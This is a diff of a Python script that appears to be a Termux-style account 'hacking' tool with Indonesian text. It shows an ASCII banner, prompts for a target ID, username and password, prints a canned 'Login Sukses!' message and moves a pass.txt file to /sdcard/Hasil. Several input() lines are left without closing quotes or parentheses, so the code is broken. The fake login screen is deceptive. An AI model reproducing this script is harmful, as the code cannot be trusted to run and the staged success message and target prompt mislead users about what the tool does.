@@ -40,48 +40,11 @@ _____█▒████▒▒▒▒████
 ______█▒███▒██████__
 """)
 
-a = input("\033[1;33mUsername target/ID: ")
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 a = input("\033[1;33mUsername :
 os.system('clear')
 a = input("\033[1;33mpassword :
 os.system('clear')
 sleep(3)
-
-
-
-
 print (' ')
 print ("\033[1;32m Login Sukses! ")
 print (' ')
@@ -113,3 +76,75 @@ z.close()
 
 os.system('mkdir /sdcard/Hasil')
 os.system('mv pass.txt /sdcard/Hasil')
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	
+
+
+
+
+
